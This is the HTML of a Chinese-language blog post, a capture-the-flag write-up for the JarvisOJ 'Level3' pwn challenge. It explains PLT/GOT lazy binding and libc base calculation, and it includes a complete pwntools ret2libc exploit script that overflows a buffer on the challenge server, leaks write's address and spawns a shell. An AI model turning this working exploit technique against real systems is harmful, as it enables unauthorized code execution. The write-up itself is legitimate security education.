@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="检查文件 检查文件保护属性 检查字符串和函数信息 很干净 但是我们发现题目同时还给力一个libc文件，所以我们可以检查一下libc文件中的函数和字符串信息 很有收获  利用点分析 同level2一样的利用方式，但是文件中没有可以直接使用的函数和字符串，所以我们需要从libc中获取system函数和&#x2F;bin&#x2F;sh字符串，新知识点GET！动态链接库.so文件中函数和字符串的获取~ 首先我们要知道，文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020.08.03.JarvisOJ-Level3">
+<meta property="og:url" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="检查文件 检查文件保护属性 检查字符串和函数信息 很干净 但是我们发现题目同时还给力一个libc文件，所以我们可以检查一下libc文件中的函数和字符串信息 很有收获  利用点分析 同level2一样的利用方式，但是文件中没有可以直接使用的函数和字符串，所以我们需要从libc中获取system函数和&#x2F;bin&#x2F;sh字符串，新知识点GET！动态链接库.so文件中函数和字符串的获取~ 首先我们要知道，文">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-03-18-00-17.png">
+<meta property="og:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-03-18-01-56.png">
+<meta property="og:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-03-18-02-27.png">
+<meta property="og:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-03-17-57-15.png">
+<meta property="og:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-03-18-04-11.png">
+<meta property="og:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-05-09-52-32.png">
+<meta property="og:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-05-10-15-01.png">
+<meta property="article:published_time" content="2020-08-03T09:29:38.000Z">
+<meta property="article:modified_time" content="2020-08-05T02:15:04.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="JarvisOJ">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="level">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/2020-08-03-JarvisOJ-Level3/2020-08-03-18-00-17.png">
+
+<link rel="canonical" href="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2020.08.03.JarvisOJ-Level3 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020.08.03.JarvisOJ-Level3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-03 17:29:38" itemprop="dateCreated datePublished" datetime="2020-08-03T17:29:38+08:00">2020-08-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-05 10:15:04" itemprop="dateModified" datetime="2020-08-05T10:15:04+08:00">2020-08-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <a id="more"></a>
+<h1 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h1><ul>
+<li>检查文件保护属性<br><img src="2020-08-03-JarvisOJ-Level3/2020-08-03-18-00-17.png"></li>
+<li>检查字符串和函数信息<br><img src="2020-08-03-JarvisOJ-Level3/2020-08-03-18-01-56.png"></li>
+<li>很干净<br><img src="2020-08-03-JarvisOJ-Level3/2020-08-03-18-02-27.png"></li>
+<li>但是我们发现题目同时还给力一个libc文件，所以我们可以检查一下libc文件中的函数和字符串信息<br><img src="2020-08-03-JarvisOJ-Level3/2020-08-03-17-57-15.png"></li>
+<li>很有收获<br><img src="2020-08-03-JarvisOJ-Level3/2020-08-03-18-04-11.png"></li>
+</ul>
+<h1 id="利用点分析"><a href="#利用点分析" class="headerlink" title="利用点分析"></a>利用点分析</h1><ul>
+<li>同level2一样的利用方式，但是文件中没有可以直接使用的函数和字符串，所以我们需要从libc中获取system函数和<code>/bin/sh</code>字符串，新知识点GET！动态链接库.so文件中函数和字符串的获取~</li>
+<li>首先我们要知道，文件偏移和动态展开</li>
+<li>文件偏移在文件中的段，相对地址，经过动态展开之后才会填充到内存中，所以实际上二进制文件中直接看到的地址并不能直接用于寻址，这个与我们在IDA中看到的地址又有所不同，IDA通过计算，将二进制文件的在内存中展开的偏移计算出来之后再呈现给我们看，此时的地址就是动态展开的地址。</li>
+<li>其次，动态展开的地址又存在一个固定基址和动态基址的问题，IDA是固定基址展开的，但是加载的时候首先要看程序是否开发了动态基址分配，其次要看加载的位置是否是默认地址，在这里我们的动态链接库加载的过程是通过程序加载的，我们需要计算的就是动态地址</li>
+<li>在程序内存中的function - 在libc文件中的function展开地址 = 在程序内存中的function - 在内存中动态展开的地址</li>
+<li>代码描述如下:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_addr = addr_write - libc_write = 第二次调用的got表中的write - libc_write</span><br></pre></td></tr></table></figure></li>
+<li>为啥是第二次调用，这里有一个填充got表的操作，如下所示<ul>
+<li>plt表是内部函数表，got表是全局函数表，两者是一一对应的关系，网上找到过一张图，描述的很形象。也就是说plt表里面放的是got表的地址，got表里面放的是函数的真实地址。</li>
+<li>所以当我们在第一次执行某个函数的时候，第一步是由函数调用跳入到PLT表中，然后第二步是从PLT表跳到GOT表中，第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第5步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到GOT表项中，然后执行函数并返回。简单的来讲就是说如果我们第一次调用某个函数，就要plt表和got表全部走一遍。</li>
+<li>而当我们第二次调用某个函数的时候，我们的第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，但是这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。<br><img src="2020-08-03-JarvisOJ-Level3/2020-08-05-09-52-32.png"></li>
+</ul>
+</li>
+</ul>
+<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="comment"># pwn.context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># 解析ELF文件，主文件：level3，Libc库：libc-2.19.so</span></span><br><span class="line">elf_data = pwn.ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc_data = pwn.ELF(<span class="string">&#x27;./libc-2.19.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ELF文件中有关信息的内存地址</span></span><br><span class="line">got_write = elf_data.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">plt_write = elf_data.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">addr_vul = elf_data.symbols[<span class="string">&quot;vulnerable_function&quot;</span>]</span><br><span class="line"><span class="comment"># libc中有关信息的内存地址</span></span><br><span class="line">libc_write = libc_data.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system = libc_data.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># ROPgadget --binary libc-2.19.so --string &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment"># 0x00162d4c : /bin/sh</span></span><br><span class="line">libc_sh = <span class="number">0x00162d4c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = pwn.process(&#x27;./level3&#x27;)</span></span><br><span class="line"><span class="comment"># nc pwn2.jarvisoj.com 9879</span></span><br><span class="line">sh = pwn.remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="number">9879</span>)</span><br><span class="line">_ = sh.recv()</span><br><span class="line"><span class="comment"># 第一部分填充缓冲区，第二部分覆盖EBP，第三部分返回到write函数，第四部分返回地址(vulnerable_function)，第五部分构造write的参数</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span> + pwn.p32(plt_write) + pwn.p32(addr_vul) + pwn.p32(<span class="number">1</span>) + pwn.p32(got_write) + pwn.p32(<span class="number">4</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 接收返回的Write的内存地址</span></span><br><span class="line">addr_write = pwn.u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">_ = sh.recv()</span><br><span class="line"><span class="comment"># 计算内存镜像基址</span></span><br><span class="line">base_addr = addr_write - libc_write</span><br><span class="line"><span class="comment"># 计算偏移地址</span></span><br><span class="line">addr_system = libc_system + base_addr</span><br><span class="line">addr_sh = libc_sh + base_addr</span><br><span class="line"><span class="comment"># 第一部分填充缓冲区，第二部分覆盖EBP，第三部分返回到system函数，第四部分返回地址，第五部分构造system的参数</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span> + pwn.p32(addr_system) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + pwn.p32(addr_sh)</span><br><span class="line"><span class="comment"># Send PayLoad Get Shell</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="2020-08-03-JarvisOJ-Level3/2020-08-05-10-15-01.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JarvisOJ/" rel="tag"># JarvisOJ</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/level/" rel="tag"># level</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/03/09_PWN/2020-08-03-JarvisOJ-Level2/" rel="prev" title="2020.08.03.JarvisOJ-Level2">
+      <i class="fa fa-chevron-left"></i> 2020.08.03.JarvisOJ-Level2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/05/09_PWN/2020-08-05-JarvisOJ-Level4/" rel="next" title="2020.08.05.JarvisOJ-Level4">
+      2020.08.05.JarvisOJ-Level4 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">检查文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">利用点分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">代码实现</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">83</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
